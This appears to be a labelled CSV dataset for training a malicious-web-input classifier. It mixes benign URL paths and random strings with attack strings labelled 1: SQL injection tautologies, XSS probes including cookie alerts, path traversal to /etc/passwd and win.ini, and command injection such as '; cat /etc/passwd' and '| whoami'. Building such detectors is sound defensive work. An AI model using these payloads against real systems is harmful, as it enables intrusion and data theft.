payload,label
' OR 3=2 --,1
/search?id=881,0
/search?id=72,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/contact?session=58304,0
user,0
<script>var a=417;alert(a)</script>,1
goQdd59qVu6gq,0
/dashboard?session=20262,0
<script>var a=229;alert(a)</script>,1
bm4lnNpFZdF,0
5b8h5bglB3,0
settings,0
register,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
login,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/cart?session=22343,0
/checkout?session=13070,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/settings?session=20291,0
' OR 1=7 --,1
<script>var a=23;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/search?session=78238,0
/home?id=6828,0
s E l E c T * f R o M a d m i n,1
/profile?id=5177,0
home,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 1=1 --,1
| whoami,1
/contact?id=4676,0
/checkout?session=62119,0
<script>alert(document.cookie)</script>,1
/home?session=59046,0
/cart?session=97939,0
<script>var a=784;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
/register?session=37317,0
/index?id=7910,0
login,0
blog,0
home,0
/about?session=99291,0
admin'/* bypass */OR 1=1,1
../../../windows/win.ini,1
tz2NE5Tolr,0
/dashboard?id=715,0
about,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
; cat /etc/passwd,1
<script>alert(document.cookie)</script>,1
/contact?session=75409,0
2eln87Bw6j2W,0
javascript:alert(1),1
Av4GQrjfyjG61PG,0
admin'/* bypass */OR 1=1,1
profile,0
dashboard,0
javascript:alert(1),1
UBm779Cwe,0
1' o r '1'='1,1
/checkout?id=1489,0
search,0
checkout,0
' OR 6=8 --,1
onerror=alert(1),1
Usz8xtVNi4q2,0
' OR 1=3 --,1
<script>var a=945;alert(a)</script>,1
' OR 7=2 --,1
D2Luep3fpKH,0
XSU5aspOZ,0
admin' --,1
/home?id=6945,0
<script>var a=480;alert(a)</script>,1
' OR 4=4 --,1
1Cqz9MmeRuRPWER,0
g8ADCvVPNQ,0
admin' --,1
ormdyO9O5X,0
search,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
4kXdJPuDu,0
PhJL22LlqMbO,0
login,0
/checkout?id=9937,0
' OR 7=7 --,1
/contact?id=6694,0
s E l E c T * f R o M a d m i n,1
O4Dgw972kFnicrE,0
' OR 5=2 --,1
/dashboard?session=87827,0
../../../windows/win.ini,1
/settings?session=71057,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin'/* bypass */OR 1=1,1
<script>var a=80;alert(a)</script>,1
IjL0yS3FsqVq,0
jRZNm2pA,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 7=3 --,1
' OR 6=1 --,1
admin'/* bypass */OR 1=1,1
' OR 6=2 --,1
contact,0
| whoami,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
| whoami,1
/dashboard?session=25588,0
/index?session=62801,0
/dashboard?id=1125,0
' OR 7=3 --,1
/index?session=82968,0
admin'/* bypass */OR 1=1,1
admin'/* bypass */OR 1=1,1
register,0
checkout,0
' OR 3=5 --,1
../../../windows/win.ini,1
' OR 1=7 --,1
dashboard,0
<script>var a=689;alert(a)</script>,1
' OR 2=1 --,1
s E l E c T * f R o M a d m i n,1
' OR 8=3 --,1
admin' --,1
blog,0
oOhDv7o7OeqgS,0
login,0
/profile?id=3367,0
/cart?id=3031,0
/checkout?id=1597,0
<script>var a=897;alert(a)</script>,1
javascript:alert(1),1
/blog?id=9801,0
M6uNCAnIv,0
register,0
register,0
admin' --,1
/checkout?id=8500,0
/index?id=3775,0
' OR 9=2 --,1
/user?id=4155,0
; cat /etc/passwd,1
' OR 5=2 --,1
index,0
U7lJqAd9rKBist1,0
ochYjF4ADAxbdG,0
/register?id=2310,0
<script>var a=659;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
<script>var a=754;alert(a)</script>,1
/blog?session=37218,0
search,0
/home?id=1920,0
; cat /etc/passwd,1
/checkout?session=90143,0
/about?id=299,0
s92mpQQ31M,0
s E l E c T * f R o M a d m i n,1
../../../../etc/passwd,1
/search?session=27081,0
CudVRQcl4nXAOK,0
/user?session=85588,0
' OR 2=5 --,1
/index?id=7379,0
profile,0
/checkout?id=8119,0
SUyXc6JJN9h,0
/index?session=33431,0
s E l E c T * f R o M a d m i n,1
about,0
/home?session=85859,0
/home?id=5240,0
' OR 8=8 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
| whoami,1
/login?id=3280,0
admin' --,1
odHf8nyQLenZ,0
/user?session=13680,0
<script>var a=655;alert(a)</script>,1
/dashboard?id=9713,0
dashboard,0
' OR 7=2 --,1
<script>var a=213;alert(a)</script>,1
' OR '1'='1,1
Ys8DnOl82yPa,0
' OR 5=5 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/checkout?session=19795,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 8=4 --,1
1' o r '1'='1,1
settings,0
/search?session=96913,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
| whoami,1
XFEJaWw0SNb3o,0
profile,0
; cat /etc/passwd,1
cart,0
bFIDpLy8MuTWE,0
<script>var a=745;alert(a)</script>,1
<script>var a=603;alert(a)</script>,1
../../../../etc/passwd,1
/dashboard?session=82751,0
contact,0
login,0
settings,0
' OR 3=7 --,1
8BZ0NRWy8BxXyre,0
/profile?id=2597,0
/dashboard?id=6157,0
/login?id=9756,0
dashboard,0
../../../windows/win.ini,1
' OR 3=9 --,1
/login?id=4734,0
; cat /etc/passwd,1
<script>alert(document.cookie)</script>,1
MQlB07uwAIGw04,0
/profile?id=2421,0
/about?session=83277,0
../../../../etc/passwd,1
../../../windows/win.ini,1
dashboard,0
<script>var a=857;alert(a)</script>,1
' OR 8=3 --,1
; cat /etc/passwd,1
../../../../etc/passwd,1
contact,0
about,0
/settings?session=17128,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
| whoami,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 6=2 --,1
<script>var a=853;alert(a)</script>,1
/contact?id=6849,0
PhSZbmjs,0
admin'/* bypass */OR 1=1,1
admin'/* bypass */OR 1=1,1
../../../windows/win.ini,1
user,0
/settings?id=8318,0
| whoami,1
' OR 6=7 --,1
teyzVfO4l6vraJh,0
admin%00' OR 1=1,1
/index?session=31482,0
/login?session=41552,0
yaeX0tKtF,0
zjMb8aCg3u,0
| whoami,1
javascript:alert(1),1
s E l E c T * f R o M a d m i n,1
kMEHHnm0Qm7ws,0
<script>var a=582;alert(a)</script>,1
' OR 9=9 --,1
6I3jCO1tlDi,0
' OR 1=1 --,1
' OR 7=8 --,1
Uf5eGXFJgQq,0
<script>var a=870;alert(a)</script>,1
/about?id=3861,0
admin'/* bypass */OR 1=1,1
/search?session=31358,0
register,0
/profile?id=8198,0
' OR 4=3 --,1
../../../windows/win.ini,1
/home?id=2386,0
/home?session=20636,0
<script>var a=725;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
1' o r '1'='1,1
admin' --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=742;alert(a)</script>,1
' OR 6=5 --,1
' OR 1=6 --,1
/checkout?session=37780,0
onerror=alert(1),1
admin'/* bypass */OR 1=1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
home,0
javascript:alert(1),1
settings,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
; cat /etc/passwd,1
../../../windows/win.ini,1
6Wc0yhf62,0
javascript:alert(1),1
about,0
' OR 6=8 --,1
/index?session=96677,0
RfAR1mNW9IyV6,0
; cat /etc/passwd,1
/checkout?id=7992,0
/dashboard?session=94959,0
' OR 4=8 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
index,0
' OR 2=7 --,1
search,0
admin'/* bypass */OR 1=1,1
<script>var a=399;alert(a)</script>,1
../../../../etc/passwd,1
' OR 7=2 --,1
user,0
| whoami,1
' OR 3=6 --,1
<script>var a=517;alert(a)</script>,1
contact,0
<script>var a=984;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
/search?id=4447,0
checkout,0
/cart?id=7680,0
user,0
/profile?session=23871,0
<script>var a=711;alert(a)</script>,1
/user?id=3615,0
1' o r '1'='1,1
<script>var a=553;alert(a)</script>,1
/dashboard?session=52368,0
/cart?id=8265,0
' OR 6=7 --,1
checkout,0
/dashboard?id=4457,0
4Xdj1G62,0
<script>var a=466;alert(a)</script>,1
<script>var a=855;alert(a)</script>,1
/home?id=9198,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../../etc/passwd,1
p6AJzuijrJQ,0
<script>alert(document.cookie)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
home,0
' OR 1=1 --,1
/cart?session=56980,0
| whoami,1
admin'/* bypass */OR 1=1,1
7bFwq2GMW,0
<script>var a=614;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
hz7zZ9jiT5nl,0
<script>var a=416;alert(a)</script>,1
onerror=alert(1),1
/checkout?session=42966,0
blog,0
admin' --,1
| whoami,1
mL4McpjKcyfcVi,0
' OR 3=4 --,1
dashboard,0
index,0
user,0
home,0
/contact?session=71956,0
javascript:alert(1),1
<script>var a=441;alert(a)</script>,1
/user?session=95414,0
checkout,0
home,0
/home?session=70670,0
Gh04icnf,0
UHBzzDF9AfONAXQ,0
<script>var a=91;alert(a)</script>,1
0SaOG3KniriQvI,0
<script>var a=958;alert(a)</script>,1
<script>var a=189;alert(a)</script>,1
onerror=alert(1),1
' OR 3=6 --,1
5kI3OFv2f,0
admin'/* bypass */OR 1=1,1
admin'/* bypass */OR 1=1,1
<script>var a=60;alert(a)</script>,1
/about?session=94989,0
about,0
/profile?id=9039,0
<script>var a=203;alert(a)</script>,1
onerror=alert(1),1
admin' --,1
| whoami,1
' OR 2=4 --,1
../../../../etc/passwd,1
settings,0
admin%00' OR 1=1,1
/index?session=61481,0
login,0
<script>var a=697;alert(a)</script>,1
/cart?id=6441,0
/about?session=39882,0
cart,0
/home?session=29781,0
/user?session=24079,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin%00' OR 1=1,1
s E l E c T * f R o M a d m i n,1
admin' --,1
tWVgMcQP0,0
cart,0
/user?id=1872,0
cRG63vqNAvIEP,0
<script>var a=569;alert(a)</script>,1
<script>var a=986;alert(a)</script>,1
ORNSJXjYge,0
l9RyV9tKXDvIp3,0
' OR 2=1 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
s E l E c T * f R o M a d m i n,1
/register?id=3965,0
' OR 1=7 --,1
login,0
../../../windows/win.ini,1
/index?session=13818,0
/home?session=58795,0
vPpVEYzhy,0
; cat /etc/passwd,1
<script>var a=685;alert(a)</script>,1
contact,0
' OR 8=4 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../windows/win.ini,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../../etc/passwd,1
/contact?id=1766,0
profile,0
onerror=alert(1),1
' OR 1=1 --,1
| whoami,1
<script>alert(document.cookie)</script>,1
/settings?id=2817,0
' OR '1'='1,1
/about?id=7115,0
/dashboard?id=5387,0
admin%00' OR 1=1,1
Cdxp3O8nSs,0
contact,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/search?session=61625,0
; cat /etc/passwd,1
' OR 1=7 --,1
' OR 1=1 --,1
login,0
/blog?id=7012,0
cart,0
bOSGTtaA,0
checkout,0
<script>var a=246;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
/checkout?session=94149,0
/register?id=261,0
user,0
<script>var a=599;alert(a)</script>,1
/index?id=8925,0
/home?session=76483,0
/login?id=6063,0
home,0
admin%00' OR 1=1,1
U3oXVLb9zG7LKp,0
<script>var a=240;alert(a)</script>,1
' OR 3=7 --,1
admin%00' OR 1=1,1
/contact?session=44469,0
1' o r '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 1=3 --,1
javascript:alert(1),1
sk7r8VjEJZD,0
admin%00' OR 1=1,1
/blog?session=75089,0
/blog?id=8073,0
/contact?id=5303,0
profile,0
checkout,0
/blog?id=9,0
<script>var a=616;alert(a)</script>,1
../../../windows/win.ini,1
/cart?session=12007,0
admin'/* bypass */OR 1=1,1
admin%00' OR 1=1,1
/contact?session=54936,0
/blog?id=2121,0
' OR 1=9 --,1
/home?id=6470,0
admin%00' OR 1=1,1
<script>var a=231;alert(a)</script>,1
profile,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/search?id=602,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
IhCGhzAE,0
uv1dztGS,0
/contact?session=87583,0
../../../windows/win.ini,1
wsbT0ungLRIuh,0
/settings?id=7504,0
oZ7ITqmACAYg,0
/about?id=9879,0
../../../windows/win.ini,1
/profile?session=19422,0
../../../windows/win.ini,1
<script>var a=295;alert(a)</script>,1
/register?session=60921,0
/search?session=83349,0
admin'/* bypass */OR 1=1,1
login,0
/profile?session=89435,0
home,0
/cart?session=16622,0
/about?id=9210,0
<script>var a=236;alert(a)</script>,1
<script>var a=171;alert(a)</script>,1
/cart?id=8777,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/about?id=9623,0
onerror=alert(1),1
/index?id=8838,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=744;alert(a)</script>,1
zB00dre6g,0
' OR '1'='1,1
/login?session=98815,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=550;alert(a)</script>,1
/checkout?id=3097,0
/register?session=32747,0
admin'/* bypass */OR 1=1,1
KVu31HyqNzhRp,0
<script>alert(document.cookie)</script>,1
javascript:alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/register?session=36236,0
2SmEuRIu,0
s E l E c T * f R o M a d m i n,1
/profile?id=8867,0
/register?session=75882,0
checkout,0
search,0
/profile?id=6593,0
admin'/* bypass */OR 1=1,1
' OR 9=7 --,1
| whoami,1
zfDiIL9Z,0
' OR 1=1 --,1
<script>alert(document.cookie)</script>,1
551p2x5RjlH,0
admin%00' OR 1=1,1
/search?session=85137,0
admin'/* bypass */OR 1=1,1
dPgWJX0WJ,0
<script>var a=64;alert(a)</script>,1
/home?id=7960,0
DV7iwgqkeI8,0
<script>var a=975;alert(a)</script>,1
1' o r '1'='1,1
EBkrTHUDMikz,0
<script>var a=937;alert(a)</script>,1
/search?session=83193,0
<script>var a=108;alert(a)</script>,1
/login?session=31124,0
Ov1KeP5mCc2T,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
9hF6TDYW8i6s5JU,0
Ciyz3gidpLBh,0
aHUOIijyfq,0
<script>var a=234;alert(a)</script>,1
1' o r '1'='1,1
register,0
register,0
hBkQjuAqBONg,0
' OR 4=2 --,1
javascript:alert(1),1
/checkout?id=9923,0
1' o r '1'='1,1
/about?id=2577,0
/profile?id=943,0
/login?id=4673,0
javascript:alert(1),1
/register?session=41278,0
/home?session=37238,0
/about?session=58510,0
/checkout?id=4861,0
/contact?id=4880,0
profile,0
1' o r '1'='1,1
home,0
<script>var a=784;alert(a)</script>,1
f5k2QySe,0
register,0
| whoami,1
/profile?session=48289,0
/contact?id=5687,0
/search?id=1403,0
' OR 8=7 --,1
search,0
CXYGJN7Z,0
search,0
72R5KslX2Jek,0
' OR '1'='1,1
/about?session=81723,0
onerror=alert(1),1
<script>var a=208;alert(a)</script>,1
/index?id=9978,0
/cart?session=44982,0
<script>var a=751;alert(a)</script>,1
<script>var a=668;alert(a)</script>,1
cart,0
FBqV1TIKfKmf7Xd,0
qg3y36ciMdnu,0
1' o r '1'='1,1
admin' --,1
<script>var a=628;alert(a)</script>,1
/blog?session=16431,0
; cat /etc/passwd,1
s E l E c T * f R o M a d m i n,1
' OR 2=4 --,1
6e2WJV3qLE7vgt,0
' OR 8=4 --,1
/home?id=298,0
/search?id=5525,0
/checkout?session=50527,0
/checkout?session=49338,0
<script>var a=542;alert(a)</script>,1
/about?id=2502,0
admin%00' OR 1=1,1
/cart?id=6234,0
' OR 3=4 --,1
/contact?id=1004,0
/settings?session=40019,0
<script>var a=868;alert(a)</script>,1
search,0
' OR 3=6 --,1
1' o r '1'='1,1
' OR 9=2 --,1
admin' --,1
<script>var a=124;alert(a)</script>,1
' OR 1=6 --,1
1' o r '1'='1,1
admin%00' OR 1=1,1
settings,0
/search?id=293,0
blog,0
search,0
/blog?session=23166,0
/search?session=36148,0
/dashboard?id=9598,0
about,0
7xq192xtYHU8a0,0
/blog?id=7080,0
settings,0
../../../../etc/passwd,1
admin' --,1
<script>var a=684;alert(a)</script>,1
' OR '1'='1,1
POU0BLaJ7,0
/blog?id=6289,0
javascript:alert(1),1
../../../windows/win.ini,1
' OR 8=2 --,1
/settings?session=81592,0
<script>var a=272;alert(a)</script>,1
/settings?id=7449,0
/profile?id=767,0
onerror=alert(1),1
admin' --,1
' OR 1=1 --,1
' OR '1'='1,1
' OR 1=1 --,1
wqnPc8Hjo,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
YVb5u5ezEhFFh,0
/user?id=5510,0
<script>var a=761;alert(a)</script>,1
onerror=alert(1),1
admin%00' OR 1=1,1
' OR 1=1 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 1=7 --,1
/cart?session=20413,0
cart,0
| whoami,1
' OR 5=3 --,1
onerror=alert(1),1
/checkout?id=1609,0
' OR 7=6 --,1
/about?id=4478,0
' OR 1=1 --,1
/blog?id=9129,0
/blog?id=4130,0
<script>var a=487;alert(a)</script>,1
' OR '1'='1,1
/cart?session=24423,0
cart,0
/about?session=13819,0
De4VnOX1BE,0
1' o r '1'='1,1
0wrg032aZF97,0
7v2zgFz6FV,0
cart,0
uMB7oFOJ,0
' OR 5=5 --,1
/user?session=49165,0
/register?session=79658,0
' OR 1=1 --,1
/home?session=78843,0
/register?session=57807,0
onerror=alert(1),1
admin' --,1
' OR 3=1 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
about,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>alert(document.cookie)</script>,1
<script>var a=406;alert(a)</script>,1
' OR 9=7 --,1
/settings?id=587,0
/settings?id=339,0
/dashboard?id=7081,0
u8jtCUUZGTJP0,0
qyEdC6kAFlOUKf9,0
contact,0
/user?id=4204,0
checkout,0
| whoami,1
/search?id=2385,0
/blog?session=83886,0
; cat /etc/passwd,1
s E l E c T * f R o M a d m i n,1
contact,0
/settings?session=74176,0
; cat /etc/passwd,1
qAMfxtJgA00,0
' OR 4=1 --,1
admin%00' OR 1=1,1
' OR 1=1 --,1
' OR '1'='1,1
profile,0
../../../../etc/passwd,1
/cart?session=76975,0
' OR 6=4 --,1
' OR 9=7 --,1
user,0
GIeXTPww,0
<script>var a=299;alert(a)</script>,1
/profile?session=42440,0
s E l E c T * f R o M a d m i n,1
' OR 6=6 --,1
<script>var a=486;alert(a)</script>,1
; cat /etc/passwd,1
admin' --,1
/profile?id=8606,0
' OR 8=5 --,1
<script>var a=740;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
<script>alert(document.cookie)</script>,1
yToj9zJe66C95Xx,0
o9SOXfeRXc0g32,0
/about?session=33053,0
admin' --,1
admin' --,1
../../../windows/win.ini,1
hoPxdm7F,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/register?id=3399,0
/home?id=4533,0
user,0
/blog?session=72765,0
admin' --,1
/dashboard?id=8801,0
<script>var a=999;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
/cart?id=6724,0
user,0
user,0
<script>var a=880;alert(a)</script>,1
admin' --,1
cart,0
/index?session=52231,0
1V9P5RXIe8,0
/checkout?id=7473,0
; cat /etc/passwd,1
/register?id=9945,0
; cat /etc/passwd,1
| whoami,1
' OR 3=8 --,1
' OR '1'='1,1
' OR 3=7 --,1
E1NKtzb40XJQiOM,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
s E l E c T * f R o M a d m i n,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/blog?id=5132,0
register,0
admin' --,1
admin' --,1
' OR 1=1 --,1
' OR 7=3 --,1
/cart?session=11562,0
<script>var a=850;alert(a)</script>,1
' OR 4=7 --,1
/settings?session=65031,0
/profile?session=87469,0
index,0
../../../../etc/passwd,1
FXIX75MpnThEVwv,0
blog,0
' OR '1'='1,1
admin' --,1
hknOP1FMxVBC,0
' OR 1=1 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
| whoami,1
H9anxRlev6,0
Swkiow590L9,0
/checkout?session=92396,0
<script>var a=54;alert(a)</script>,1
/dashboard?id=1946,0
' OR '1'='1,1
JNf8riM7C9N,0
d222OxPB,0
<script>var a=915;alert(a)</script>,1
' OR 6=8 --,1
/login?id=9354,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin'/* bypass */OR 1=1,1
admin' --,1
' OR 9=6 --,1
/checkout?id=9673,0
' OR 9=9 --,1
/cart?id=1627,0
cY4nAyMbG7gWa,0
' OR 1=1 --,1
<script>alert(document.cookie)</script>,1
kv0ssPDATd,0
/user?session=47500,0
checkout,0
admin' --,1
' OR 3=3 --,1
ZG59Ui34lxawrbG,0
/cart?id=5926,0
/dashboard?id=1654,0
/contact?id=1043,0
' OR 7=8 --,1
/register?session=46918,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 3=8 --,1
NpAYg5g7k05q,0
/blog?id=3424,0
<script>var a=732;alert(a)</script>,1
onerror=alert(1),1
cart,0
<script>alert(document.cookie)</script>,1
onerror=alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=739;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
admin%00' OR 1=1,1
<script>alert(document.cookie)</script>,1
/search?id=5095,0
f8KxRFQKQOXDm,0
profile,0
' OR 1=1 --,1
admin'/* bypass */OR 1=1,1
/about?session=30339,0
/profile?id=7352,0
<script>var a=351;alert(a)</script>,1
' OR 6=6 --,1
checkout,0
/register?session=63249,0
javascript:alert(1),1
<script>var a=46;alert(a)</script>,1
' OR 5=3 --,1
viLG4jASp,0
<script>var a=910;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
<script>var a=794;alert(a)</script>,1
/home?session=83536,0
O7XfhAyG00,0
/login?id=6176,0
register,0
XJixywxhw4PesY,0
login,0
s E l E c T * f R o M a d m i n,1
admin' --,1
/search?id=9318,0
' OR 2=5 --,1
/blog?session=94333,0
/home?session=27755,0
SJxgBgnftjfKsI,0
login,0
admin%00' OR 1=1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=861;alert(a)</script>,1
uOQua9L8Y5MK,0
../../../windows/win.ini,1
; cat /etc/passwd,1
TOogUibl12Wa4,0
/profile?id=5163,0
/blog?session=79872,0
../../../../etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
../../../windows/win.ini,1
cart,0
<script>alert(document.cookie)</script>,1
contact,0
onerror=alert(1),1
<script>var a=399;alert(a)</script>,1
KtiVUR1uBO5k,0
| whoami,1
admin'/* bypass */OR 1=1,1
4VpUGCOE,0
s E l E c T * f R o M a d m i n,1
<script>var a=744;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
user,0
9saTjIaLz,0
<script>var a=396;alert(a)</script>,1
| whoami,1
; cat /etc/passwd,1
; cat /etc/passwd,1
' OR 1=2 --,1
onerror=alert(1),1
checkout,0
<script>var a=741;alert(a)</script>,1
' OR 2=6 --,1
../../../../etc/passwd,1
/user?session=79666,0
/login?session=44894,0
admin'/* bypass */OR 1=1,1
/login?session=79843,0
xiF26pWbPpH,0
' OR '1'='1,1
' OR 1=6 --,1
/dashboard?session=23281,0
' OR '1'='1,1
/blog?id=1006,0
admin'/* bypass */OR 1=1,1
Z3lihFy993K2FH,0
/about?session=46219,0
javascript:alert(1),1
' OR 9=1 --,1
<script>var a=221;alert(a)</script>,1
/search?session=56028,0
../../../../etc/passwd,1
home,0
<script>var a=185;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
' OR 7=4 --,1
<script>var a=169;alert(a)</script>,1
' OR 5=6 --,1
home,0
J4lW7UHsf,0
' OR '1'='1,1
/contact?session=52944,0
COArtmFQ,0
register,0
/checkout?session=11635,0
/settings?id=2194,0
oFYZLFYtKMA7,0
' OR 1=1 --,1
/profile?id=4206,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
hLStvuDHj,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 4=4 --,1
checkout,0
<script>alert(document.cookie)</script>,1
s E l E c T * f R o M a d m i n,1
' OR 5=8 --,1
/checkout?id=6065,0
/home?session=74980,0
/index?session=10512,0
utwqwGBvHtrzWUj,0
<script>var a=344;alert(a)</script>,1
/cart?id=186,0
<script>var a=183;alert(a)</script>,1
<script>var a=789;alert(a)</script>,1
/home?id=8232,0
/register?session=21775,0
<script>var a=773;alert(a)</script>,1
/register?id=2620,0
' OR 1=1 --,1
' OR 9=3 --,1
/search?id=25,0
dashboard,0
javascript:alert(1),1
/user?id=2194,0
fEIdXcxgfJZqb6J,0
7prZShyH82L,0
/search?id=4708,0
javascript:alert(1),1
<script>var a=38;alert(a)</script>,1
<script>var a=114;alert(a)</script>,1
<script>var a=373;alert(a)</script>,1
/index?id=3333,0
SnfxFloEosil,0
efqX2D0YQsnIIE,0
admin'/* bypass */OR 1=1,1
onerror=alert(1),1
' OR 3=3 --,1
/blog?session=35936,0
admin' --,1
blog,0
../../../windows/win.ini,1
admin' --,1
/index?session=98018,0
javascript:alert(1),1
<script>alert(document.cookie)</script>,1
<script>var a=191;alert(a)</script>,1
/dashboard?id=7632,0
/home?session=55094,0
1' o r '1'='1,1
<script>var a=4;alert(a)</script>,1
/index?id=4871,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 6=7 --,1
login,0
dashboard,0
dashboard,0
login,0
admin'/* bypass */OR 1=1,1
/index?id=8984,0
<script>var a=797;alert(a)</script>,1
profile,0
s E l E c T * f R o M a d m i n,1
' OR 7=4 --,1
Nevhz3MpNkqh,0
blog,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/cart?id=7398,0
' OR 1=5 --,1
<script>var a=999;alert(a)</script>,1
register,0
/checkout?id=2093,0
login,0
search,0
/contact?id=1897,0
YDar67MkRTOv2,0
admin'/* bypass */OR 1=1,1
' OR 7=8 --,1
<script>var a=626;alert(a)</script>,1
D6WAQhCOPAb,0
' OR 6=4 --,1
blog,0
admin%00' OR 1=1,1
' OR 1=1 --,1
<script>var a=820;alert(a)</script>,1
search,0
/register?session=94040,0
<script>var a=342;alert(a)</script>,1
8rDKxZIUHx,0
nR73bwsDV,0
admin' --,1
contact,0
<script>alert(document.cookie)</script>,1
user,0
/register?id=755,0
<script>var a=136;alert(a)</script>,1
/home?session=87355,0
/contact?session=85758,0
' OR '1'='1,1
YjnCgLy8Gh3tGf,0
/blog?id=8409,0
Z17pB7Ws,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../../etc/passwd,1
' OR 9=2 --,1
<script>alert(document.cookie)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../windows/win.ini,1
../../../../etc/passwd,1
